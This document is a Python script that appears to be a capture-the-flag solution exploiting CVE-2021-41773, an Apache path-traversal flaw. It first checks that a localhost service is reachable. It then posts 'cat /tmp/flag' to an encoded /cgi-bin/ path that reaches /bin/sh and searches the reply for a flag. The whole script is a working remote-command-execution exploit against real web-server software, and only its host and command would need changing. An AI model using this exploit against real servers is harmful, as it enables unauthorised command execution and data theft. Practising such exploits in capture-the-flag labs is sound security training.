import socket
import time
import re

host = "127.0.0.1"
port = 32808

print(f"[+] Testing connection to {host}:{port}")

# First, test basic connectivity
try:
    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_sock.settimeout(2)
    test_sock.connect((host, port))
    print("[+] Connection established successfully")
    test_sock.close()
except Exception as e:
    print(f"[-] Connection failed: {str(e)}")
    print("[!] Server may not be running or port is incorrect")
    exit(1)

# Try basic HTTP request first
print("\n[+] Sending basic HTTP request...")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    
    request = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    sock.sendall(request.encode())
    
    response = b""
    sock.settimeout(2)
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    
    sock.close()
    
    print(f"[+] Basic request response: {len(response)} bytes")
    print(response.decode('utf-8', errors='ignore')[:500])
    
except Exception as e:
    print(f"[-] Basic request failed: {str(e)}")

# Now try the exploit
print("\n[+] Attempting CVE-2021-41773 exploit")
print("[+] Target: /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh")
print("[+] Command: cat /tmp/flag")

time.sleep(0.5)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    
    command = "cat /tmp/flag"
    path = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    
    request = f"POST {path} HTTP/1.1\r\n"
    request += f"Host: {host}\r\n"
    request += f"Content-Length: {len(command)}\r\n"
    request += "Connection: close\r\n"
    request += "\r\n"
    request += command
    
    print(f"[+] Sending request...")
    sock.sendall(request.encode())
    
    print(f"[+] Waiting for response...")
    response = b""
    sock.settimeout(3)
    
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            print(f"[+] Received {len(chunk)} bytes")
    except socket.timeout:
        print("[+] Timeout reached, processing received data")
    
    sock.close()
    
    response_text = response.decode('utf-8', errors='ignore')
    
    print(f"\n[+] Total response: {len(response)} bytes")
    print(f"[+] Full Response:")
    print(response_text)
    print()
    
    # Search for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
    
    if flag_match:
        flag = flag_match.group(0)
        print(f"[!] FLAG FOUND: {flag}")
    else:
        print("[-] No FLAG{} pattern found")

except Exception as e:
    print(f"[-] Exploit failed: {type(e).__name__}: {str(e)}")
    import traceback
    traceback.print_exc()

